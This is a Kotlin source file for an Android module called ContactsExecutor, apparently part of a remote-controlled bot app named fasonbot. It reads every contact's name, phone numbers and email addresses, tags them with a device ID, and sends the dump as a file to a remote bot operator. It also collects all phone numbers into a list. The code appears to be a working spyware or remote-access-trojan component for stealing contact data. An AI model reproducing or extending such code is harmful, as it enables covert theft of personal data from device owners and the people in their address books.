package com.fasonbot.app.action

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.util.PermissionHelper
import java.io.File

class ContactsExecutor(context: Context) : BaseExecutor(context) {

    companion object {
        private const val TAG = "ContactsExecutor"
    }

    private val deviceId: String by lazy { DeviceManager.getDeviceId(context) }

    @SuppressLint("Range")
    fun execute() {
        if (!PermissionHelper.hasReadContacts(context)) {
            sendResponse("❌ <b>Permission Denied</b>\n\nContacts access not granted.", parseMode = "HTML")
            return
        }
        try {
            val content = StringBuilder()
            content.append("👥 CONTACTS\n")
            content.append("━━━━━━━━━━━━━━━━━━━━━━━━\n")
            content.append("📱 ${BotConfig.getDeviceName()}\n")
            content.append("🆔 $deviceId\n")
            content.append("━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
            val resolver: ContentResolver = context.contentResolver
            var count = 0
            resolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
            )?.use { cursor ->
                while (cursor.moveToNext()) {
                    count++
                    val id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
                    val name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                    content.append("👤 <b>$name</b>\n")
                    if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        resolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id), null
                        )?.use { pCur ->
                            while (pCur.moveToNext()) {
                                val phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                val phoneType = pCur.getInt(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE))
                                val typeIcon = when (phoneType) {
                                    ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "📱"
                                    ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "🏠"
                                    ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "💼"
                                    else -> "📞"
                                }
                                content.append("  $typeIcon $phoneNo\n")
                            }
                        }
                    }
                    resolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                        "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                        arrayOf(id), null
                    )?.use { eCur ->
                        while (eCur.moveToNext()) {
                            val email = eCur.getString(eCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))
                            content.append("  📧 $email\n")
                        }
                    }
                    content.append("────────────────────────\n")
                }
            }
            content.append("\n📊 Total: $count contacts")
            sendFileAsDocument("Contacts_${BotConfig.getDeviceName()}", content.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Get contacts error: ${e.message}")
            sendResponse("❌ <b>Error</b>\n\n${e.message}", parseMode = "HTML")
        }
    }

    @SuppressLint("Range")
    fun getAllPhoneNumbers(): List<String> {
        if (!PermissionHelper.hasReadContacts(context)) return emptyList()
        val phoneNumbers = mutableSetOf<String>()
        try {
            val resolver: ContentResolver = context.contentResolver
            resolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)?.use { cursor ->
                while (cursor.moveToNext()) {
                    val id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
                    if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        resolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id), null
                        )?.use { pCur ->
                            while (pCur.moveToNext()) {
                                val phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                phoneNumbers.add(phoneNo)
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Get phone numbers error: ${e.message}")
        }
        return phoneNumbers.toList()
    }

    private fun sendFileAsDocument(name: String, content: String) {
        var file: File? = null
        try {
            file = createTempFile(name, content)
            if (file != null) {
                sendDocument(file, caption = "👥 Contacts")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send file error: ${e.message}")
            sendResponse("❌ <b>Error</b>\n\n${e.message}", parseMode = "HTML")
        } finally {
            deleteTempFile(file)
        }
    }
}
